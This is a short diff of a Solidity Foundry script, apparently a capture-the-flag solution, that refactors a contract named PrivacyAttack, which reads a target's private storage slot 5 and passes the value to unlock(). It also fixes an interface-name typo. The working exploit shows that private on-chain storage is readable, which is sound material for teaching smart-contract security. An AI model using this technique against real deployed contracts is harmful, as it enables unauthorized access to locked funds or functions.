@@ -3,16 +3,17 @@
 pragma solidity ^0.8.19;
 
 import {Broadcasted} from "./Broadcasted.sol";
-import {console} from "forge-std/Script.sol";
 
 contract PrivacyAttack is Broadcasted {
+    uint256 internal constant STORAGE_SLOT = 5;
+
     function attack(address payable privacyCtr_) public payable override {
-        bytes32 key = vm.load(privacyCtr_, bytes32(uint256(5)));
-        IPravacy(privacyCtr_).unlock(bytes16(key));
+        bytes32 key = vm.load(privacyCtr_, bytes32(uint256(STORAGE_SLOT)));
+        IPrivacy(privacyCtr_).unlock(bytes16(key));
     }
 }
 
-interface IPravacy {
+interface IPrivacy {
     //! storage positions
     /**
      * bool public locked = true;                              //! slot 0
